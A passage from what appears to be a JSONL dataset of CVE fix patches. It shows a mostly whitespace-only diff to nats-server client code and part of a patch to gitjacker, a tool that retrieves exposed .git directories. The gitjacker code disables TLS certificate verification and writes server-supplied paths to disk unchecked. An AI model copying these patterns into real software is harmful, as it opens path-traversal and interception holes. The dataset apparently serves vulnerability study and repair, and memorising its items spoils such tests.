{\n-\t\t\tif sub.isClosed() {\n-\t\t\t\tgoto REMOVE\n-\t\t\t}\n-\t\t}\n-\t\tfor _, qsub := range pac.results.qsubs {\n-\t\t\tfor _, sub := range qsub {\n-\t\t\t\tif sub.isClosed() {\n-\t\t\t\t\tgoto REMOVE\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t\tcontinue\n-\tREMOVE:\n-\t\tdelete(c.in.pacache, cacheKey)\n-\t}\n+        for cacheKey, pac := range c.in.pacache {\n+                for _, sub := range pac.results.psubs {\n+                        if sub.isClosed() {\n+                                goto REMOVE\n+                        }\n+                }\n+                for _, qsub := range pac.results.qsubs {\n+                        for _, sub := range qsub {\n+                                if sub.isClosed() {\n+                                        goto REMOVE\n+                                }\n+                        }\n+                }\n+                continue\n+        REMOVE:\n+                delete(c.in.pacache, cacheKey)\n+        }\n }\n \n // Returns our service account for this request.\n func (ci *ClientInfo) serviceAccount() string {\n-\tif ci == nil {\n-\t\treturn _EMPTY_\n-\t}\n-\tif ci.Service != _EMPTY_ {\n-\t\treturn ci.Service\n-\t}\n-\treturn ci.Account\n+        if ci == nil {\n+                return _EMPTY_\n+        }\n+        if ci.Service != _EMPTY_ {\n+                return ci.Service\n+        }\n+        return ci.Account\n }\n \n // Add in our server and cluster information to this client info.\n func (c *client) addServerAndClusterInfo(ci *ClientInfo) {\n-\tif ci == nil {\n-\t\treturn\n-\t}\n-\t// Server\n-\tif c.kind != LEAF {\n-\t\tci.Server = c.srv.Name()\n-\t} else if c.kind == LEAF {\n-\t\tci.Server = c.leaf.remoteServer\n-\t}\n-\t// Cluster\n-\tci.Cluster = c.srv.cachedClusterName()\n-\t// If we have gateways fill in cluster alternates.\n-\t// These will be in RTT asc order.\n-\tif c.srv.gateway.enabled {\n-\t\tvar gws []*client\n-\t\tc.srv.getOutboundGatewayConnections(&gws)\n-\t\tfor _, c := range gws {\n-\t\t\tc.mu.Lock()\n-\t\t\tcn := c.gw.name\n-\t\t\tc.mu.Unlock()\n-\t\t\tci.Alternates = append(ci.Alternates, cn)\n-\t\t}\n-\t}\n+        if ci == nil {\n+                return\n+        }\n+        // Server\n+        if c.kind != LEAF {\n+                ci.Server = c.srv.Name()\n+        } else if c.kind == LEAF {\n+                ci.Server = c.leaf.remoteServer\n+        }\n+        // Cluster\n+        ci.Cluster = c.srv.cachedClusterName()\n+        // If we have gateways fill in cluster alternates.\n+        // These will be in RTT asc order.\n+        if c.srv.gateway.enabled {\n+                var gws []*client\n+                c.srv.getOutboundGatewayConnections(&gws)\n+                for _, c := range gws {\n+                        c.mu.Lock()\n+                        cn := c.gw.name\n+                        c.mu.Unlock()\n+                        ci.Alternates = append(ci.Alternates, cn)\n+                }\n+        }\n }\n \n // Grabs the information for this client.\n func (c *client) getClientInfo(detailed bool) *ClientInfo {\n-\tif c == nil || (c.kind != CLIENT && c.kind != LEAF && c.kind != JETSTREAM && c.kind != ACCOUNT) {\n-\t\treturn nil\n-\t}\n-\n-\t// Result\n-\tvar ci ClientInfo\n-\n-\tif detailed {\n-\t\tc.addServerAndClusterInfo(&ci)\n-\t}\n-\n-\tc.mu.Lock()\n-\t// RTT and Account are always added.\n-\tci.Account = accForClient(c)\n-\tci.RTT = c.rtt\n-\t// Detailed signals additional opt in.\n-\tif detailed {\n-\t\tci.Start = &c.start\n-\t\tci.Host = c.host\n-\t\tci.ID = c.cid\n-\t\tci.Name = c.opts.Name\n-\t\tci.User = c.getRawAuthUser()\n-\t\tci.Lang = c.opts.Lang\n-\t\tci.Version = c.opts.Version\n-\t\tci.Jwt = c.opts.JWT\n-\t\tci.IssuerKey = issuerForClient(c)\n-\t\tci.NameTag = c.nameTag\n-\t\tci.Tags = c.tags\n-\t\tci.Kind = c.kindString()\n-\t\tci.ClientType = c.clientTypeString()\n-\t}\n-\tc.mu.Unlock()\n-\treturn &ci\n+        if c == nil || (c.kind != CLIENT && c.kind != LEAF && c.kind != JETSTREAM && c.kind != ACCOUNT) {\n+                return nil\n+        }\n+\n+        // Result\n+        var ci ClientInfo\n+\n+        if detailed {\n+                c.addServerAndClusterInfo(&ci)\n+        }\n+\n+        c.mu.Lock()\n+        // RTT and Account are always added.\n+        ci.Account = accForClient(c)\n+        ci.RTT = c.rtt\n+        // Detailed signals additional opt in.\n+        if detailed {\n+                ci.Start = &c.start\n+                ci.Host = c.host\n+                ci.ID = c.cid\n+                ci.Name = c.opts.Name\n+                ci.User = c.getRawAuthUser()\n+                ci.Lang = c.opts.Lang\n+                ci.Version = c.opts.Version\n+                ci.Jwt = c.opts.JWT\n+                ci.IssuerKey = issuerForClient(c)\n+                ci.NameTag = c.nameTag\n+                ci.Tags = c.tags\n+                ci.Kind = c.kindString()\n+                ci.ClientType = c.clientTypeString()\n+        }\n+        c.mu.Unlock()\n+        return &ci\n }\n \n func (c *client) doTLSServerHandshake(typ string, tlsConfig *tls.Config, timeout float64, pCerts PinnedCertSet) error {\n-\t_, err := c.doTLSHandshake(typ, false, nil, tlsConfig, _EMPTY_, timeout, pCerts)\n-\treturn err\n+        _, err := c.doTLSHandshake(typ, false, nil, tlsConfig, _EMPTY_, timeout, pCerts)\n+        return err\n }\n \n func (c *client) doTLSClientHandshake(typ string, url *url.URL, tlsConfig *tls.Config, tlsName string, timeout float64, pCerts PinnedCertSet) (bool, error) {\n-\treturn c.doTLSHandshake(typ, true, url, tlsConfig, tlsName, timeout, pCerts)\n+        return c.doTLSHandshake(typ, true, url, tlsConfig, tlsName, timeout, pCerts)\n }\n \n // Performs either server or client side (if solicit is true) TLS Handshake.\n@@ -5101,122 +5103,122 @@ func (c *client) doTLSClientHandshake(typ string, url *url.URL, tlsConfig *tls.C\n //\n // Lock is held on entry.\n func (c *client) doTLSHandshake(typ string, solicit bool, url *url.URL, tlsConfig *tls.Config, tlsName string, timeout float64, pCerts PinnedCertSet) (bool, error) {\n-\tvar host string\n-\tvar resetTLSName bool\n-\tvar err error\n-\n-\t// Capture kind for some debug/error statements.\n-\tkind := c.kind\n-\n-\t// If we solicited, we will act like the client, otherwise the server.\n-\tif solicit {\n-\t\tc.Debugf(\"Starting TLS %s client handshake\", typ)\n-\t\tif tlsConfig.ServerName == _EMPTY_ {\n-\t\t\t// If the given url is a hostname, use this hostname for the\n-\t\t\t// ServerName. If it is an IP, use the cfg's tlsName. If none\n-\t\t\t// is available, resort to current IP.\n-\t\t\thost = url.Hostname()\n-\t\t\tif tlsName != _EMPTY_ && net.ParseIP(host) != nil {\n-\t\t\t\thost = tlsName\n-\t\t\t}\n-\t\t\ttlsConfig.ServerName = host\n-\t\t}\n-\t\tc.nc = tls.Client(c.nc, tlsConfig)\n-\t} else {\n-\t\tif kind == CLIENT {\n-\t\t\tc.Debugf(\"Starting TLS client connection handshake\")\n-\t\t} else {\n-\t\t\tc.Debugf(\"Starting TLS %s server handshake\", typ)\n-\t\t}\n-\t\tc.nc = tls.Server(c.nc, tlsConfig)\n-\t}\n-\n-\tconn := c.nc.(*tls.Conn)\n-\n-\t// Setup the timeout\n-\tttl := secondsToDuration(timeout)\n-\tc.tlsTo = time.AfterFunc(ttl, func() { tlsTimeout(c, conn) })\n-\tconn.SetReadDeadline(time.Now().Add(ttl))\n-\n-\tc.mu.Unlock()\n-\tif err = conn.Handshake(); err != nil {\n-\t\tif solicit {\n-\t\t\t// Based on type of error, possibly clear the saved tlsName\n-\t\t\t// See: https://github.com/nats-io/nats-server/issues/1256\n-\t\t\tif _, ok := err.(x509.HostnameError); ok {\n-\t\t\t\tif host == tlsName {\n-\t\t\t\t\tresetTLSName = true\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t} else if !c.matchesPinnedCert(pCerts) {\n-\t\terr = ErrCertNotPinned\n-\t}\n-\n-\tif err != nil {\n-\t\tif kind == CLIENT {\n-\t\t\tc.Errorf(\"TLS handshake error: %v\", err)\n-\t\t} else {\n-\t\t\tc.Errorf(\"TLS %s handshake error: %v\", typ, err)\n-\t\t}\n-\t\tc.closeConnection(TLSHandshakeError)\n-\n-\t\t// Grab the lock before returning since the caller was holding the lock on entry\n-\t\tc.mu.Lock()\n-\t\t// Returning any error is fine. Since the connection is closed ErrConnectionClosed\n-\t\t// is appropriate.\n-\t\treturn resetTLSName, ErrConnectionClosed\n-\t}\n-\n-\t// Reset the read deadline\n-\tconn.SetReadDeadline(time.Time{})\n-\n-\t// Re-Grab lock\n-\tc.mu.Lock()\n-\n-\t// To be consistent with client, set this flag to indicate that handshake is done\n-\tc.flags.set(handshakeComplete)\n-\n-\t// The connection still may have been closed on success handshake due\n-\t// to a race with tls timeout. If that the case, return error indicating\n-\t// that the connection is closed.\n-\tif c.isClosed() {\n-\t\terr = ErrConnectionClosed\n-\t}\n-\n-\treturn false, err\n+        var host string\n+        var resetTLSName bool\n+        var err error\n+\n+        // Capture kind for some debug/error statements.\n+        kind := c.kind\n+\n+        // If we solicited, we will act like the client, otherwise the server.\n+        if solicit {\n+                c.Debugf(\"Starting TLS %s client handshake\", typ)\n+                if tlsConfig.ServerName == _EMPTY_ {\n+                        // If the given url is a hostname, use this hostname for the\n+                        // ServerName. If it is an IP, use the cfg's tlsName. If none\n+                        // is available, resort to current IP.\n+                        host = url.Hostname()\n+                        if tlsName != _EMPTY_ && net.ParseIP(host) != nil {\n+                                host = tlsName\n+                        }\n+                        tlsConfig.ServerName = host\n+                }\n+                c.nc = tls.Client(c.nc, tlsConfig)\n+        } else {\n+                if kind == CLIENT {\n+                        c.Debugf(\"Starting TLS client connection handshake\")\n+                } else {\n+                        c.Debugf(\"Starting TLS %s server handshake\", typ)\n+                }\n+                c.nc = tls.Server(c.nc, tlsConfig)\n+        }\n+\n+        conn := c.nc.(*tls.Conn)\n+\n+        // Setup the timeout\n+        ttl := secondsToDuration(timeout)\n+        c.tlsTo = time.AfterFunc(ttl, func() { tlsTimeout(c, conn) })\n+        conn.SetReadDeadline(time.Now().Add(ttl))\n+\n+        c.mu.Unlock()\n+        if err = conn.Handshake(); err != nil {\n+                if solicit {\n+                        // Based on type of error, possibly clear the saved tlsName\n+                        // See: https://github.com/nats-io/nats-server/issues/1256\n+                        if _, ok := err.(x509.HostnameError); ok {\n+                                if host == tlsName {\n+                                        resetTLSName = true\n+                                }\n+                        }\n+                }\n+        } else if !c.matchesPinnedCert(pCerts) {\n+                err = ErrCertNotPinned\n+        }\n+\n+        if err != nil {\n+                if kind == CLIENT {\n+                        c.Errorf(\"TLS handshake error: %v\", err)\n+                } else {\n+                        c.Errorf(\"TLS %s handshake error: %v\", typ, err)\n+                }\n+                c.closeConnection(TLSHandshakeError)\n+\n+                // Grab the lock before returning since the caller was holding the lock on entry\n+                c.mu.Lock()\n+                // Returning any error is fine. Since the connection is closed ErrConnectionClosed\n+                // is appropriate.\n+                return resetTLSName, ErrConnectionClosed\n+        }\n+\n+        // Reset the read deadline\n+        conn.SetReadDeadline(time.Time{})\n+\n+        // Re-Grab lock\n+        c.mu.Lock()\n+\n+        // To be consistent with client, set this flag to indicate that handshake is done\n+        c.flags.set(handshakeComplete)\n+\n+        // The connection still may have been closed on success handshake due\n+        // to a race with tls timeout. If that the case, return error indicating\n+        // that the connection is closed.\n+        if c.isClosed() {\n+                err = ErrConnectionClosed\n+        }\n+\n+        return false, err\n }\n \n // getRAwAuthUser returns the raw auth user for the client.\n // Lock should be held.\n func (c *client) getRawAuthUser() string {\n-\tswitch {\n-\tcase c.opts.Nkey != \"\":\n-\t\treturn c.opts.Nkey\n-\tcase c.opts.Username != \"\":\n-\t\treturn c.opts.Username\n-\tcase c.opts.JWT != \"\":\n-\t\treturn c.pubKey\n-\tcase c.opts.Token != \"\":\n-\t\treturn c.opts.Token\n-\tdefault:\n-\t\treturn \"\"\n-\t}\n+        switch {\n+        case c.opts.Nkey != \"\":\n+                return c.opts.Nkey\n+        case c.opts.Username != \"\":\n+                return c.opts.Username\n+        case c.opts.JWT != \"\":\n+                return c.pubKey\n+        case c.opts.Token != \"\":\n+                return c.opts.Token\n+        default:\n+                return \"\"\n+        }\n }\n \n // getAuthUser returns the auth user for the client.\n // Lock should be held.\n func (c *client) getAuthUser() string {\n-\tswitch {\n-\tcase c.opts.Nkey != \"\":\n-\t\treturn fmt.Sprintf(\"Nkey %q\", c.opts.Nkey)\n-\tcase c.opts.Username != \"\":\n-\t\treturn fmt.Sprintf(\"User %q\", c.opts.Username)\n-\tcase c.opts.JWT != \"\":\n-\t\treturn fmt.Sprintf(\"JWT User %q\", c.pubKey)\n-\tdefault:\n-\t\treturn `User \"N/A\"`\n-\t}\n+        switch {\n+        case c.opts.Nkey != \"\":\n+                return fmt.Sprintf(\"Nkey %q\", c.opts.Nkey)\n+        case c.opts.Username != \"\":\n+                return fmt.Sprintf(\"User %q\", c.opts.Username)\n+        case c.opts.JWT != \"\":\n+                return fmt.Sprintf(\"JWT User %q\", c.pubKey)\n+        default:\n+                return `User \"N/A\"`\n+        }\n }\n \n // Given an array of strings, this function converts it to a map as long\n@@ -5228,93 +5230,93 @@ func (c *client) getAuthUser() string {\n // If there are unknown connection types, the map of valid ones is returned\n // along with an error that contains the name of the unknown.\n func convertAllowedConnectionTypes(cts []string) (map[string]struct{}, error) {\n-\tvar unknown []string\n-\tm := make(map[string]struct{}, len(cts))\n-\tfor _, i := range cts {\n-\t\ti = strings.ToUpper(i)\n-\t\tswitch i {\n-\t\tcase jwt.ConnectionTypeStandard, jwt.ConnectionTypeWebsocket,\n-\t\t\tjwt.ConnectionTypeLeafnode, jwt.ConnectionTypeLeafnodeWS,\n-\t\t\tjwt.ConnectionTypeMqtt, jwt.ConnectionTypeMqttWS:\n-\t\t\tm[i] = struct{}{}\n-\t\tdefault:\n-\t\t\tunknown = append(unknown, i)\n-\t\t}\n-\t}\n-\tvar err error\n-\t// We will still return the map of valid ones.\n-\tif len(unknown) != 0 {\n-\t\terr = fmt.Errorf(\"invalid connection types %q\", unknown)\n-\t}\n-\treturn m, err\n+        var unknown []string\n+        m := make(map[string]struct{}, len(cts))\n+        for _, i := range cts {\n+                i = strings.ToUpper(i)\n+                switch i {\n+                case jwt.ConnectionTypeStandard, jwt.ConnectionTypeWebsocket,\n+                        jwt.ConnectionTypeLeafnode, jwt.ConnectionTypeLeafnodeWS,\n+                        jwt.ConnectionTypeMqtt, jwt.ConnectionTypeMqttWS:\n+                        m[i] = struct{}{}\n+                default:\n+                        unknown = append(unknown, i)\n+                }\n+        }\n+        var err error\n+        // We will still return the map of valid ones.\n+        if len(unknown) != 0 {\n+                err = fmt.Errorf(\"invalid connection types %q\", unknown)\n+        }\n+        return m, err\n }\n \n // This will return true if the connection is of a type present in the given `acts` map.\n // Note that so far this is used only for CLIENT or LEAF connections.\n // But a CLIENT can be standard or websocket (and other types in the future).\n func (c *client) connectionTypeAllowed(acts map[string]struct{}) bool {\n-\t// Empty means all type of clients are allowed\n-\tif len(acts) == 0 {\n-\t\treturn true\n-\t}\n-\tvar want string\n-\tswitch c.kind {\n-\tcase CLIENT:\n-\t\tswitch c.clientType() {\n-\t\tcase NATS:\n-\t\t\twant = jwt.ConnectionTypeStandard\n-\t\tcase WS:\n-\t\t\twant = jwt.ConnectionTypeWebsocket\n-\t\tcase MQTT:\n-\t\t\tif c.isWebsocket() {\n-\t\t\t\twant = jwt.ConnectionTypeMqttWS\n-\t\t\t} else {\n-\t\t\t\twant = jwt.ConnectionTypeMqtt\n-\t\t\t}\n-\t\t}\n-\tcase LEAF:\n-\t\tif c.isWebsocket() {\n-\t\t\twant = jwt.ConnectionTypeLeafnodeWS\n-\t\t} else {\n-\t\t\twant = jwt.ConnectionTypeLeafnode\n-\t\t}\n-\t}\n-\t_, ok := acts[want]\n-\treturn ok\n+        // Empty means all type of clients are allowed\n+        if len(acts) == 0 {\n+                return true\n+        }\n+        var want string\n+        switch c.kind {\n+        case CLIENT:\n+                switch c.clientType() {\n+                case NATS:\n+                        want = jwt.ConnectionTypeStandard\n+                case WS:\n+                        want = jwt.ConnectionTypeWebsocket\n+                case MQTT:\n+                        if c.isWebsocket() {\n+                                want = jwt.ConnectionTypeMqttWS\n+                        } else {\n+                                want = jwt.ConnectionTypeMqtt\n+                        }\n+                }\n+        case LEAF:\n+                if c.isWebsocket() {\n+                        want = jwt.ConnectionTypeLeafnodeWS\n+                } else {\n+                        want = jwt.ConnectionTypeLeafnode\n+                }\n+        }\n+        _, ok := acts[want]\n+        return ok\n }\n \n // isClosed returns true if either closeConnection or connMarkedClosed\n // flag have been set, or if `nc` is nil, which may happen in tests.\n func (c *client) isClosed() bool {\n-\treturn c.flags.isSet(closeConnection) || c.flags.isSet(connMarkedClosed) || c.nc == nil\n+        return c.flags.isSet(closeConnection) || c.flags.isSet(connMarkedClosed) || c.nc == nil\n }\n \n // Logging functionality scoped to a client or route.\n func (c *client) Error(err error) {\n-\tc.srv.Errors(c, err)\n+        c.srv.Errors(c, err)\n }\n \n func (c *client) Errorf(format string, v ...interface{}) {\n-\tformat = fmt.Sprintf(\"%s - %s\", c, format)\n-\tc.srv.Errorf(format, v...)\n+        format = fmt.Sprintf(\"%s - %s\", c, format)\n+        c.srv.Errorf(format, v...)\n }\n \n func (c *client) Debugf(format string, v ...interface{}) {\n-\tformat = fmt.Sprintf(\"%s - %s\", c, format)\n-\tc.srv.Debugf(format, v...)\n+        format = fmt.Sprintf(\"%s - %s\", c, format)\n+        c.srv.Debugf(format, v...)\n }\n \n func (c *client) Noticef(format string, v ...interface{}) {\n-\tformat = fmt.Sprintf(\"%s - %s\", c, format)\n-\tc.srv.Noticef(format, v...)\n+        format = fmt.Sprintf(\"%s - %s\", c, format)\n+        c.srv.Noticef(format, v...)\n }\n \n func (c *client) Tracef(format string, v ...interface{}) {\n-\tformat = fmt.Sprintf(\"%s - %s\", c, format)\n-\tc.srv.Tracef(format, v...)\n+        format = fmt.Sprintf(\"%s - %s\", c, format)\n+        c.srv.Tracef(format, v...)\n }\n \n func (c *client) Warnf(format string, v ...interface{}) {\n-\tformat = fmt.Sprintf(\"%s - %s\", c, format)\n-\tc.srv.Warnf(format, v...)\n+        format = fmt.Sprintf(\"%s - %s\", c, format)\n+        c.srv.Warnf(format, v...)\n }\n"}
{"cve":"CVE-2021-29417:0708", "fix_patch": "diff --git a/internal/pkg/gitjacker/retriever.go b/internal/pkg/gitjacker/retriever.go\nindex 3066e69..fb07c17 100644\n--- a/internal/pkg/gitjacker/retriever.go\n+++ b/internal/pkg/gitjacker/retriever.go\n@@ -1,401 +1,413 @@\n package gitjacker\n \n import (\n-\t\"fmt\"\n-\t\"io/ioutil\"\n-\t\"net/http\"\n-\t\"net/url\"\n-\t\"os\"\n-\t\"os/exec\"\n-\t\"path/filepath\"\n-\t\"regexp\"\n-\t\"strings\"\n-\t\"time\"\n+        \"fmt\"\n+        \"io/ioutil\"\n+        \"net/http\"\n+        \"net/url\"\n+        \"os\"\n+        \"os/exec\"\n+        \"path/filepath\"\n+        \"regexp\"\n+        \"strings\"\n+        \"time\"\n     \"crypto/tls\"\n \n-\t\"github.com/sirupsen/logrus\"\n+        \"github.com/sirupsen/logrus\"\n )\n \n var paths = []string{\n-\t\"refs/heads/master\",\n-\t\"objects/info/packs\",\n-\t\"description\",\n-\t\"COMMIT_EDITMSG\",\n-\t\"index\",\n-\t\"packed-refs\",\n-\t\"refs/stash\",\n-\t\"logs/HEAD\",\n-\t\"logs/refs/heads/master\",\n-\t\"logs/refs/remotes/origin/HEAD\",\n-\t\"info/refs\",\n-\t\"info/exclude\",\n-\t\"packed-refs\",\n+        \"refs/heads/master\",\n+        \"objects/info/packs\",\n+        \"description\",\n+        \"COMMIT_EDITMSG\",\n+        \"index\",\n+        \"packed-refs\",\n+        \"refs/stash\",\n+        \"logs/HEAD\",\n+        \"logs/refs/heads/master\",\n+        \"logs/refs/remotes/origin/HEAD\",\n+        \"info/refs\",\n+        \"info/exclude\",\n+        \"packed-refs\",\n }\n \n var ErrNotVulnerable = fmt.Errorf(\"no .git directory is available at this URL\")\n \n type retriever struct {\n-\tbaseURL    *url.URL\n-\toutputDir  string\n-\thttp       *http.Client\n-\tdownloaded map[string]bool\n-\tsummary    Summary\n+        baseURL    *url.URL\n+        outputDir  string\n+        http       *http.Client\n+        downloaded map[string]bool\n+        summary    Summary\n }\n \n type Status uint\n \n const (\n-\tStatusUnknown Status = iota\n-\tStatusFailure\n-\tStatusPartialSuccess\n-\tStatusSuccess\n+        StatusUnknown Status = iota\n+        StatusFailure\n+        StatusPartialSuccess\n+        StatusSuccess\n )\n \n type Summary struct {\n-\tPackInformationAvailable bool\n-\tFoundObjects             []string\n-\tMissingObjects           []string\n-\tStatus                   Status\n-\tOutputDirectory          string\n-\tConfig                   Config\n+        PackInformationAvailable bool\n+        FoundObjects             []string\n+        MissingObjects           []string\n+        Status                   Status\n+        OutputDirectory          string\n+        Config                   Config\n }\n \n type Config struct {\n-\tRepositoryName string\n-\tRemotes        []Remote\n-\tBranches       []Branch\n-\tUser           User\n-\tGithubToken    GithubToken\n+        RepositoryName string\n+        Remotes        []Remote\n+        Branches       []Branch\n+        User           User\n+        GithubToken    GithubToken\n }\n \n type User struct {\n-\tName     string\n-\tEmail    string\n-\tUsername string\n+        Name     string\n+        Email    string\n+        Username string\n }\n \n type GithubToken struct {\n-\tUsername string\n-\tToken    string\n+        Username string\n+        Token    string\n }\n \n type Remote struct {\n-\tName string\n-\tURL  string\n+        Name string\n+        URL  string\n }\n \n type Branch struct {\n-\tName   string\n-\tRemote string\n+        Name   string\n+        Remote string\n }\n \n func New(target *url.URL, outputDir string) *retriever {\n \n-\trelative, _ := url.Parse(\".git/\")\n-\ttarget = target.ResolveReference(relative)\n+        relative, _ := url.Parse(\".git/\")\n+        target = target.ResolveReference(relative)\n     customTransport := http.DefaultTransport.(*http.Transport).Clone()\n     customTransport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}\n     customTransport.Proxy = http.ProxyFromEnvironment\n \n-\treturn &retriever{\n-\t\tbaseURL:   target,\n-\t\toutputDir: outputDir,\n-\t\thttp: &http.Client{\n-\t\t\tTimeout: time.Second * 10,\n+        return &retriever{\n+                baseURL:   target,\n+                outputDir: outputDir,\n+                http: &http.Client{\n+                        Timeout: time.Second * 10,\n             Transport: customTransport,\n-\t\t},\n-\t\tdownloaded: make(map[string]bool),\n-\t\tsummary: Summary{\n-\t\t\tOutputDirectory: outputDir,\n-\t\t},\n-\t}\n+                },\n+                downloaded: make(map[string]bool),\n+                summary: Summary{\n+                        OutputDirectory: outputDir,\n+                },\n+        }\n }\n \n func (r *retriever) checkVulnerable() error {\n-\tif err := r.downloadFile(\"HEAD\"); err != nil {\n-\t\treturn fmt.Errorf(\"%w: %s\", ErrNotVulnerable, err)\n-\t}\n+        if err := r.downloadFile(\"HEAD\"); err != nil {\n+                return fmt.Errorf(\"%w: %s\", ErrNotVulnerable, err)\n+        }\n \n-\tfilePath := filepath.Join(r.outputDir, \".git\", \"HEAD\")\n-\thead, err := ioutil.ReadFile(filePath)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n+        filePath := filepath.Join(r.outputDir, \".git\", \"HEAD\")\n+        head, err := ioutil.ReadFile(filePath)\n+        if err != nil {\n+                return err\n+        }\n \n-\tif !strings.HasPrefix(string(head), \"ref: \") {\n-\t\treturn ErrNotVulnerable\n-\t}\n+        if !strings.HasPrefix(string(head), \"ref: \") {\n+                return ErrNotVulnerable\n+        }\n \n-\treturn nil\n+        return nil\n }\n \n func (r *retriever) parsePackMetadata(meta []byte) error {\n-\tlines := strings.Split(string(meta), \"\\n\")\n-\tfor _, line := range lines {\n-\t\tparts := strings.Split(strings.TrimSpace(line), \" \")\n-\t\tif parts[0] == \"P\" && len(parts) == 2 {\n-\t\t\tif err := r.downloadFile(fmt.Sprintf(\"objects/pack/%s\", parts[1])); err != nil {\n-\t\t\t\tlogrus.Debugf(\"Failed to retrieve pack file %s: %s\", parts[1], err)\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn nil\n+        lines := strings.Split(string(meta), \"\\n\")\n+        for _, line := range lines {\n+                parts := strings.Split(strings.TrimSpace(line), \" \")\n+                if parts[0] == \"P\" && len(parts) == 2 {\n+                        if err := r.downloadFile(fmt.Sprintf(\"objects/pack/%s\", parts[1])); err != nil {\n+                                logrus.Debugf(\"Failed to retrieve pack file %s: %s\", parts[1], err)\n+                        }\n+                }\n+        }\n+        return nil\n }\n \n func (r *retriever) parsePackFile(filename string, data []byte) error {\n \n-\tf, err := os.Open(filepath.Join(r.outputDir, \".git\", filename))\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdefer func() { _ = f.Close() }()\n+        f, err := os.Open(filepath.Join(r.outputDir, \".git\", filename))\n+        if err != nil {\n+                return err\n+        }\n+        defer func() { _ = f.Close() }()\n \n-\tcmd := exec.Command(\"git\", \"unpack-objects\")\n-\tcmd.Stdin = f\n-\tcmd.Dir = r.outputDir\n-\treturn cmd.Run()\n+        cmd := exec.Command(\"git\", \"unpack-objects\")\n+        cmd.Stdin = f\n+        cmd.Dir = r.outputDir\n+        return cmd.Run()\n }\n \n func (r *retriever) downloadFile(path string) error {\n \n-\tpath = strings.TrimSpace(path)\n-\n-\tfilePath := filepath.Join(r.outputDir, \".git\", path)\n-\n-\tif r.downloaded[path] {\n-\t\treturn nil\n-\t}\n-\tr.downloaded[path] = true\n-\n-\trelative, err := url.Parse(path)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tabsolute := r.baseURL.ResolveReference(relative)\n-\tresp, err := r.http.Get(absolute.String())\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"failed to retrieve %s: %w\", absolute.String(), err)\n-\t}\n-\tdefer func() { _ = resp.Body.Close() }()\n-\n-\tif resp.StatusCode != http.StatusOK {\n-\t\treturn fmt.Errorf(\"unexpected status code for url %s : %d\", absolute.String(), resp.StatusCode)\n-\t}\n-\n-\tcontent, err := ioutil.ReadAll(resp.Body)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tif err := os.MkdirAll(filepath.Dir(filePath), 0755); err != nil {\n-\t\treturn err\n-\t}\n-\n-\tif !strings.HasSuffix(path, \"/\") {\n-\t\tif err := ioutil.WriteFile(filePath, content, 0640); err != nil {\n-\t\t\treturn fmt.Errorf(\"failed to write %s: %w\", filePath, err)\n-\t\t}\n-\t}\n-\n-\tswitch path {\n-\tcase \"HEAD\":\n-\t\tref := strings.TrimPrefix(string(content), \"ref: \")\n-\t\tif err := r.downloadFile(ref); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\treturn nil\n-\tcase \"config\":\n-\t\treturn r.analyseConfig(content)\n-\tcase \"objects/pack/\":\n-\t\t// parse the directory listing\n-\t\tpackFiles := packLinkRegex.FindAllStringSubmatch(string(content), -1)\n-\t\tfor _, packFile := range packFiles {\n-\t\t\tif len(packFile) <= 1 {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\tif err := r.downloadFile(fmt.Sprintf(\"objects/pack/%s\", packFile[1])); err != nil {\n-\t\t\t\tlogrus.Debugf(\"Failed to retrieve pack file %s: %s\", packFile[1], err)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\treturn nil\n-\tcase \"objects/info/packs\":\n-\t\treturn r.parsePackMetadata(content)\n-\t}\n-\n-\tif strings.HasSuffix(path, \".pack\") {\n-\t\treturn r.parsePackFile(path, content)\n-\t}\n-\n-\tif strings.HasPrefix(path, \"refs/heads/\") {\n-\t\tif _, err := r.downloadObject(string(content)); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\treturn nil\n-\t}\n-\n-\thash := filepath.Base(filepath.Dir(path)) + filepath.Base(path)\n-\n-\tobjectType, err := r.getObjectType(hash)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tswitch objectType {\n-\tcase GitCommitFile:\n-\n-\t\tcommit, err := r.readCommit(hash)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\t\tlogrus.Debugf(\"Successfully retrieved commit %s.\", hash)\n-\n-\t\tif commit.Tree != \"\" {\n-\t\t\tif _, err := r.downloadObject(commit.Tree); err != nil {\n-\t\t\t\tlogrus.Debugf(\"Object %s is missing and likely packed.\", commit.Tree)\n-\t\t\t}\n-\t\t}\n-\t\tfor _, parent := range commit.Parents {\n-\t\t\tif _, err := r.downloadObject(parent); err != nil {\n-\t\t\t\tlogrus.Debugf(\"Object %s is missing and likely packed.\", parent)\n-\t\t\t}\n-\t\t}\n-\n-\tcase GitTreeFile:\n-\n-\t\ttree, err := r.readTree(hash)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\t\tlogrus.Debugf(\"Successfully retrieved tree %s.\", hash)\n-\n-\t\tfor _, subHash := range tree.Objects {\n-\t\t\tif _, err := r.downloadObject(subHash); err != nil {\n-\t\t\t\tlogrus.Debugf(\"Object %s is missing and likely packed.\", subHash)\n-\t\t\t}\n-\t\t}\n-\tcase GitBlobFile:\n-\t\tlogrus.Debugf(\"Successfully retrieved blob %s.\", hash)\n-\tdefault:\n-\t\treturn fmt.Errorf(\"unknown git file type for %s: %s\", path, objectType)\n-\t}\n-\n-\treturn nil\n+        path = strings.TrimSpace(path)\n+\n+        filePath := filepath.Join(r.outputDir, \".git\", path)\n+\n+        if r.downloaded[path] {\n+                return nil\n+        }\n+        r.downloaded[path] = true\n+\n+        relative, err := url.Parse(path)\n+        if err != nil {\n+                return err\n+        }\n+\n+        absolute := r.baseURL.ResolveReference(relative)\n+        resp, err := r.http.Get(absolute.String())\n+        if err != nil {\n+                return fmt.Errorf(\"failed to retrieve %s: %w\", absolute.String(), err)\n+        }\n+        defer func() { _ = resp.Body.Close() }()\n+\n+        if resp.StatusCode != http.StatusOK 